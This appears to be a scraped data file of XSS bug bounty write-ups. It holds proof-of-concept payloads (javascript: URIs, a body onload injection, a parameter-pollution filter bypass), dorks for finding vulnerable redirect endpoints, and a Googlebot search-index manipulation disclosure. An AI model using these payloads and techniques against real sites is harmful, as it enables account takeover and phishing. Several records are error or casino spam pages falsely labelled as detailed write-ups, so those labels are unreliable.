feasible for me. Thank you! - Michael Charest, November 26, 2024 R The transaction went through perfectly. No issues. Happy customer. - Robert Chisholm, November 20, 2024 R Happy to support huge domains.com, they sold me the domain that I needed, and the paperwork was painless. Will happily use them again. - Richard Lawson, November 19, 2024 See more testimonials Customer success stories Read inspiring stories about people who found great domains. I've always loved the saying 'think globally, work locally,' and I think this is one of the keys to growing a business. Eddie Deva, PixelBull.com Read the story Our promise to you 30-day money back guarantee HugeDomains provides a 100% satisfaction guarantee on every domain name that we sell through our website. If you buy a domain and are unhappy with it, we will accept the return within 30 days and issue a full refund – no questions asked. Quick delivery of the domain In most cases access to the domain will be available within one to two hours of purchase, however access to domains purchased after business hours will be available within the next business day. Safe and secure shopping Your online safety and security is our top priority. We understand the importance of protecting your personal information. We protect your information through SSL encryption technology, providing the safest, most secure shopping experience possible. Additionally, you may checkout with PayPal or Escrow.com. FAQs See more FAQs How do I transfer to another registrar such as GoDaddy? Yes, you can transfer your domain to any registrar or hosting company once you have purchased it. Since domain transfers are a manual process, it can take up to 5 days to transfer the domain. Domains purchased with payment plans are not eligible to transfer until all payments have been made. Please remember that our 30-day money back guarantee is void once a domain has been transferred. For transfer instructions to GoDaddy, please click here . How do I get the domain after the purchase? Once you purchase the domain we will push it into an account for you at our registrar, NameBright.com, we will then send you an email with your NameBright username and password. In most cases access to the domain will be available within one to two hours of purchase, however access to domains purchased after business hours will be available within the next business day. What comes with the domain name? Nothing else is included with the purchase of the domain name. Our registrar NameBright.com does offer email packages for a yearly fee, however you will need to find hosting and web design services on your own. Do you offer payment plans? Yes we offer payment plans for up to 12 months. See details . How do I keep my personal information private? If you wish the domain ownership information to be private, add WhoIs Privacy Protection to your domain. This hides your personal information from the general public. To add privacy protection to your domain, do so within your registrar account. NameBright offers WhoIs Privacy Protection for free for the first year, and then for a small fee for subsequent years. Whois information is not updated immediately. It typically takes several hours for Whois data to update, and different registrars are faster than others. Usually your Whois information will be fully updated within two days. See more FAQs Your Web address means everything – watch our video see why Your Web address means everything watch our video see why Other domains you might like HackersLide.com ▸ See domain $3,495 HeyHackers.com ▸ See domain $2,995 BdHackers.com ▸ See domain $1,595 Quick stats Domain length 9 characters Keywords Hackers , ID Base domain HackersID TLD extension .com HackersID.com ▸ Buy now ▸ Start Payment Plan Shop Home Categories Payment plans My account Safe and secure Money back guarantee Escrow.com NameBright.com Testimonials Helpful Tips Buying guide Case studies FAQs About us Overview Contact us Terms and conditions Privacy policy Talk to a domain expert: +1-303-893-0552 © 2024 HugeDomains.com. All rights reserved."}
{"source_url": "https://medium.com/@nandwanajatin25/story-of-a-uri-based-xss-with-some-simple-google-dorking-e1999254aa55", "title": "Story of a uri based xss with some simple google dorking | by Jatin Nandwana | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nandwanajatin25/story-of-a-uri-based-xss-with-some-simple-google-dorking-e1999254aa55. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStory of a uri based xss with some simple google dorking | by Jatin Nandwana | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Jatin Nandwana 2 min read · Jun 2, 2019 -- 1 Listen Share Story of a uri based xss with some simple google dorking Hey everyone, This is a old xss bug which I found in a private program on hackerone by doing some google recon. Because it was a private program I will the name the site as www.example.com everywhere. So lets start, The program seemed to be quite old but its scope was wide with a bunch of domains.I thought that many people might have already tested the main domain. So I thought of exploring other domains in the list first. During the initial testing I did’nt find anything useful.Then I thought of doing some google dorking using Site:*.example.com inurl:redirect and appending various things like intext: ../index, admin , sql , url , redirect etc. After using redirect in inurl parameter I got an interesting endpoint like this example.com/social?redirect=/somewhere It suddenly took my interest and I started looking for bugs in it. First I tried redirecting it to google.com and it worked. Then I thought of javascript uri parsers which can lead to xss. And added this simple javascript uri in redirect parameter example.com/social?redirect=javascript://alert(1) And now the site took me to the login page as I was not logged in to the site. I logged in and alert popped up. There was also no protection on logout so user can be logged out of his account and then again be sent to this malicious url and when he enters the creds xss executes and the attacker can do whatever he want like phishing, cookie stealing, keylogging, etc. Unfortunately the same endpoint was also on some other domains of that program so they were also vulnerable. The program responded very fastly and gave a good reward. THINGS TO CONSIDER FROM THIS BUG: If you are lost in a program and dont find anything, always look for other things like google dorking, reading source code for some other endpoints which are not seen in main app and might be many hunters have missed them. QUICK TIP I will add a small list of dorks you can use to find these kind of bugs. inurl: redirect,url,next,redirect_to,page,site These can even lead to ssrf if there is not proper sanitization in code.So keep digging on these. You can also try other dorks for finding hidden gems. You can find the latest updated dorks here https://www.exploit-db.com/google-hacking-database . Google dorking is great to find some sensitive endpoints,parameters, always give it a try during your testing :) I will post some of my more findings here in the upcoming weeks. Till then keep hacking and sharing. This community is great and we should learn from each other and share. #TogetherWeHitHarder Thanks, Jatin Twitter : https://twitter.com/techyfreakk Security Infosec Bug Bounty Pentesting Hackerone -- -- 1 Written by Jatin Nandwana 131 followers · 1 following Web application pentester Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@fbotes2/try-harder-for-xss-7aa3657255a1", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@fbotes2/try-harder-for-xss-7aa3657255a1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://gauravnarwani.com/xssed-my-way-to-1000/", "title": "Not Acceptable!", "friendly_explanation": "This is a bug bounty writeup from https://gauravnarwani.com/xssed-my-way-to-1000/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNot Acceptable! Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security."}
{"source_url": "https://noobe.io/articles/2019-06/reflected-xss-on-error-page", "title": "Page Not Found - XVIP", "friendly_explanation": "This is a bug bounty writeup from https://noobe.io/articles/2019-06/reflected-xss-on-error-page. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPage Not Found - XVIP Chuyển đến nội dung Game Hot Live Casino Hướng Dẫn Link Xvip Đăng Ký Đăng Nhập Nạp Tiền Rút Tiền Khuyến Mãi Hỏi Đáp Thường Gặp Liên Hệ Về Chúng Tôi đăng ký 404 Ối! Không thể tìm thấy trang đó. Có vẻ như không có gì được tìm thấy ở vị trí này. Có thể thử một trong các liên kết dưới đây hoặc tìm kiếm? XVIP là cổng game đang gây sốt hiện nay với nhiều phần thưởng cho thành viên mới. Tải ngay trên iOS/Android tại XVIP.casino. LIÊN HỆ HỖ TRỢ Phone: +84-943-347-586 Email: [email protected] LIÊN KẾT NHANH Link XVIP Giới Thiệu Chăm Sóc Khách Hàng Khuyến Mãi Tại XVIP Nạp Tiền / Rút Tiền Hỏi Đáp Thường Gặp Chính Sách Bảo Mật Miễn Trừ Trách Nhiệm Copyright 2025 © Bản quyền thuộc XVIP"}
{"source_url": "https://medium.com/@matarpan33r/stored-xss-on-edmodo-67b244824fa5", "title": "Stored XSS on Edmodo. Hello everyone,\nI believe sharing is… | by Rohit Verma | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@matarpan33r/stored-xss-on-edmodo-67b244824fa5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS on Edmodo. Hello everyone, I believe sharing is… | by Rohit Verma | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS on Edmodo Rohit Verma 1 min read · May 28, 2019 -- Listen Share Hello everyone, I believe sharing is caring, and I have been learning from multiple security researchers in the Infosec community. So here is the write-up of my recent finding. The web application allows you to create a virtual library. In the library, you can add files, folder , links, quiz. And when a user adds the name to the folder with evil chars, it was sanitized correctly. After hours of enumeration, I found another endpoint where only the folder name was getting reflected, and it was not correctly being sanitized. Below are the steps to reproduce the stored XSS vulnerability: 1: Open Https://edmodo.com/library 2: Make a new folder 3: Input this payload “ </title></head><body onload=alert(1)></body><! — “ in the name field. 4: Intercept the request and note down the [folder-id] 5: Open https://www.edmodo.com/folder/[folder-id ] , a pop-up will come. Press enter or click to view image in full size Thanks, everyone for reading my write-up! Thanks a lot, Chip for quick responses and cool swag. About me: https://twitter.com/ 5eren1ty https://facebook.com/5eren1ty Security Bug Bounty Information Security Xss Attack Hacking -- -- Written by Rohit Verma 25 followers · 1 following Security Researcher No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "http://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/", "title": "XSS attacks on Googlebot allow search index manipulation - Tom Anthony", "friendly_explanation": "This is a bug bounty writeup from http://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS attacks on Googlebot allow search index manipulation - Tom Anthony Tom Anthony About Tom Iâ€™m an SEO Analyst at Distilled, which keeps me very busy so Iâ€™m no longer available for freelance Web Development or SEO work. Sorry! Over the last few years, when not working on cool web projects, Iâ€™ve been kept mostly busy studying for my PhD in Artificial Intelligence. Iâ€™m currently writing up my thesis, and am looking forward to having achieved that goal. If youâ€™d like to read my publications, you can visit my University of Hertfordshire web page about my research which is concerned with Information Theoretic Methods for Generating Intelligent Behaviours. My areas of interest include search engine optimisation, web development, mobile devices and all the cool things they can do, artificial intelligence and artificial life, martial arts and puzzles. Blog Posts Contact If you have a question about one of my blog posts, please do post in the comments section so that others can also help to answer and benefit from the discussion. If you are interested in hiring me for a freelance SEO or Web Development project, then unfortunately Iâ€™m probably going to be unable to take it on because Iâ€™m very busy and my priority is with my day job and my most important project of all â€“ my soon to be born daughter! However, if you think you have a compelling project and want to try to persuade me, or just get my feedback, then please fill in the form below. XSS attacks on Googlebot allow search index manipulation May 1, 2019 All Posts | Security | SEO Short version: Googlebot is based on Google Chrome version 41 (2015), and therefore it has no XSS Auditor, which later versions of Chrome use to protect the user from XSS attacks. Many sites are susceptible to XSS Attacks, where the URL can be manipulated to inject unsanitized Javascript code into the site. Since Googlebot executes Javascript, this allows an attacker to craft XSS URLs that can manipulate the content of victim sites. This manipulation can include injecting links, which Googlebot will follow to crawl the destination site. This presumably manipulates PageRank, but I’ve not tested that for fear of impacting real sites rankings. I reported this to Google in November 2018, but after 5 months they had made no headway on the issue (citing internal communication difficulties), and therefore I’m publishing details such that site owners and companies can defend their own sites from this sort of attack. Google have now told me they do not have immediate plans to remedy this. Last year I published details of an attack against Google’s handling of XML Sitemaps , which allowed an attacker to ‘borrow’ PageRank from other sites and rank illegitimate sites for competitive terms in Google’s search results. Following that, I had been investigating other potential attack when my colleague at Distilled, Robin Lord , mentioned the concept of Javascript injection attacks which got me thinking. XSS Attacks There are various types of cross-site scripting (XSS) attack; we are interested in the situation where Javascript code inside the URL is included inside the content of the page without being sanitized. This can result in the Javascript code being executed in the user’s browser (even though the code isn’t intended to be part of the site). For example, imagine this snippet of PHP code which is designed to show the value of the page URL parameter: If someone was to craft a malicious URL where instead of a number in the page parameter they instead put a snippet of Javascript: https://foo.com/stores/?page=<script>alert('hello')</script> Then it may produce some HTML with inline Javascript, which the page authors had never intended to be there: That malicious Javascript could do all sorts of evil things, such as steal data from the victim page, or trick the user into thinking the content they are looking at is authentic. The user may be visiting a trusted domain, and therefore trust the contents of the page, which are being manipulated by a hacker. Chrome to the rescue It is for that reason that Google Chrome has an XSS Auditor, which attempts to identify this type of attack and protect the user (by refusing to load the page): So far, so good. Googlebot = Chrome 41 Googlebot is currently based on Chrome version 41, which we know from Google’s own documentation. We also know that for the last couple of years Google have been promoting the fact that Googlebot executes and indexes Javascript on the sites it crawls. Chrome 41 had no XSS Auditor (that I’m aware of, it certainly doesn’t block any XSS that I’ve tried), and therefore my theory was that Googlebot likely has no XSS Auditor. So the first step was to check, whether Googlebot (or Google’s Website Rendering Service [WRS], to be more precise) would actually render a URL with an XSS attack. One of my early tests was on the startup bank, Revolut — a 3 year old fintech startup with $330M in funding having XSS vulnerabilities demonstrates the breadth of the XSS issue (they’ve now fixed this example). I used Google’s Mobile Friendly Tool to render the page, which quickly confirms Google’s WRS executes the XSS Javascript, in this case I’m crudely injecting a link at the top of the page: It is often (as in the case with Revolut) possible to entirely replace the content of the page to create your own page and content, hosted on the victim domain. Content + links are cached I submitted a test page to the Google index, and then examining the cache of these pages shows that the link being added to the page does appear in the Google index: Canonicals A second set of experiments demonstrated (again via the mobile friendly tool) that you can change the canonicals on pages: Which I also confirmed via Google’s URL Inspector Tool, which reports the injected canonical as the true canonical (h/t to Sam Nemzer for the suggestion): Links are crawled and considered At this point, I had confirmed that Google’s WRS is susceptible to XSS attacks, and that Google were crawling the pages, executing the Javascript, indexing the content and considering the search directives within (i.e. the canonicals). The next important stage, is does Google find links on these pages and crawl them. Placing links on other sites is the backbone of the PageRank algorithm and a key factor for how sites rank in Google’s algorithm. To test this, I crafted a page on Revolut which contained a link to a page on one of my test domains which I had just created moments before, and had previously not existed. I submitted the Revolut page to Google and later on Googlebot crawled the target page on my test domain. The page later appeared in the Google search results: This demonstrated that Google was identifying and crawling injected links. Furthermore, Google confirms that Javascript links are treated identically to HTML links (thanks Joel Mesherghi ): All of this demonstrates that there is potential to manipulate the Google search results. However, I was unsure how to test this without actually impacting legitimate search results, so I stopped where I was (I asked Google for permission to do this in a controlled fashion a few days back, but not had an answer just yet). How could this be abused? The obvious attack vector here is to inject links into other websites to manipulate the search results – a few links from prominent sites can make a very dramatic difference to search performance. The https://www.openbugbounty.org/ lists more than 125,000 un-patched XSS vulnerabilities . This included 260 .gov domains, 971 .edu domains, and 195 of the top 500 domains (as ranked by the Majestic Million top million sites. A second attack vector is to create malicious pages (maybe redirecting people to a malicious checkout, or directing visitors to a competing product) which would be crawled and indexed by Google. This content could even drive featured snippets and appear directly in the search results. Firefox doesn’t yet have adequate XSS protection, so this pages would load for Google users searching with Firefox. Defence The most obvious way to defend against this is to take security seriously and try to ensure you don’t have XSS vulnerabilities on your site. However, given then numbers from OpenBugBounty above, it is clear that that is more difficult that it sounds – which is the exact reason that Google added the XSS Auditor to Chrome! One quick thing you can do is check your server logs and search for URLs that have terms such as ‘script’ in them, indicating a possible XSS attempt. Wrap up This exploit is a combination of existing issues, but combine to form an zero-day exploit that has potential to be very harmful for Google users. I reported the issue to Google back on November 2018, but they have not confirmed the issue from their side or made any headway addressing it. They cited “difficulties in communication with the team investigating”, which felt a lot like what happened during the report of XML Sitemaps exploit . My impression is that if a security issue affects a not commonly affected part of Google, then the internal lines of communication are not well oiled. It was March when I got the first details, when Google let me know “that our existing protection mechanisms should be able to prevent this type of abuse but the team is still running checks to validate this” – which didn’t agree with the evidence. I re-ran some of my tests and didn’t see a difference. The security team themselves were very responsive, as usual, but seemingly had no way to move things forward unfortunately. It was 140 days after the report when I let Google know I’d be publicly disclosing the vulnerability, given the lack of movement and the fact that this could already be impacting both Google search users, as well as website owners and advertisers. To their credit, Google didn’t attempt to dissuade me and asked me to simply to use my best judgement in what I publish. If you have any questions, comments or information you can find me on Twitter at @TomAnthonySEO , or if you are interested in consulting for technical/specialised SEO, you can contact me via Distilled . Disclosure Timeline 3rd November 2018 – I filed the initial bug report. Over the next few weeks/months we went back and forth a bit. 11th February 2019 – Google responded letting me know they were “surfacing some difficulties in communication with the team investigating” 17th April 2018 – Google confirmed they have no immediate plans to fix this. I believe this is probably because they are preparing to release a new build of Googlebot shortly (I wonder if this was why the back and forth was slow – they were hoping to release the update?) 7 responses to “XSS attacks on Googlebot allow search index manipulation” peter May 2, 2019 at 7:32 am can this trick works now?i want to check? what will be the code if i want to a specific page of mine to other domain, let me know zsh May 2, 2019 at 1:07 pm In the timeline is April 18 2018 supposed to be 2019? Thanks Doc Sheldon May 2, 2019 at 8:09 pm Thanks for this, Tom… VERY concerning, particularly with Google’s response being “… do not have immediate plans to remedy this.” You’ve just got a new follower! 😉 Kirill T. May 3, 2019 at 8:59 am Nice finding, Tom. By the way, some Russian guy has translated this article, but I rather prefer the original. Lukas May 6, 2019 at 8:12 am I have a feeling that last update in disclosure timeline has the wrong year in it. Yannick May 7, 2019 at 10:14 pm Google just announced at I/O that they would use the latest version of Chromium from now on to crawl. Interpromote May 8, 2019 at 4:28 am Looks like google pushed that Googlebot build update today for Chrome 74. Wonder if that means this is fixed? Learn more about me on my about page . Find me on LinkedIn , Twitter / X , or BlueSky ."}
{"source_url": "https://www.mohamedharon.com/2019/09/dom-based-xss-in-private-program.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/09/dom-based-xss-in-private-program.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://medium.com/@momenbasel/from-parameter-pollution-to-xss-d095e13be060", "title": "from parameter pollution to XSS. Hi, | by Mo'men Basel | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@momenbasel/from-parameter-pollution-to-xss-d095e13be060. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nfrom parameter pollution to XSS. Hi, | by Mo'men Basel | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mo'men Basel 3 min read · May 16, 2019 -- 1 Listen Share from parameter pollution to XSS Hi, I’m going to talk about XSS I found on a website. I noticed that on clicking on any link on the main page it will redirect the user to a page to make sure that the user is aware that this will redirect him/her to another website. the URL looks like this: <redacted>/intersticial.aspx?dest=http://whitelistedWebsite.com Press enter or click to view image in full size once click aceptar you will be redirected I tried editing the whitelistedWebsite.com to javascript:alert(1) but it didn’t work as the URL must match the whitelisted sites. then I tried to redirect to /intersticial.aspx?dest=javascript://whitelistedWebsite.com and opened the chome devtools Press enter or click to view image in full size javascript parameter accepted as a scheme I concluded that the parameter accepts any scheme but a whitelisted website must be added to the scheme. example: /intersticial.aspx?dest=data://whitelistedWebsite.com → Accepted /intersticial.aspx?dest=http://google.com → not Accepted I tried to think for a way to write javascript and the URL together and get the javascript run. I tried to add %0a%0d which adds a newline but redirected to a forbidden page. I started thinking of adding the whitelisted website as a variable then add a semicolon which terminates javascript line but the website doesn’t accept adding a semicolon to this parameter and redirects me to the homepage instead as the URL must be after the scheme directly not after var url=whitelistedWebsite.com. I tried to enter javascript:/whitelistedWebsite.com/i as a value of parameter “dest” and found out that parameter not only accepts schemes like(http://, ftp://) but also accept http:/ and javascript:/. after that Regex immediately came to my thought for those who don’t know about regex it is a sequence of characters that define a search pattern and can be used at almost any programming language. /intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i;alert(document.domain) then website refused the request as it includes a semicolon and I want to put anything to separate this two valid javascript statement to be able to execute JS. then I tried to add another parameter with the same name “dest “ so the URL became <redacted>intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i&dest= Press enter or click to view image in full size Then I noticed that there is a comma added to the URL then added an alert function on the second parameter value and once I clicked acceptar Press enter or click to view image in full size Voilà!, XSS confirmed. the final URL: <redacted>intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i&dest=alert(1) Conclusion: may HTTP parameter pollution don’t lead to serious harm but can help on a bypass that may reach you to P1 or P2 vulnerability. if you find that a parameter accepts redirect to javascript://website.com then you should never lose hope and keep searching! JavaScript Xss Security Hacking Paramters -- -- 1 Written by Mo'men Basel 125 followers · 100 following Just another curious security-enthusiast with a programming background. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
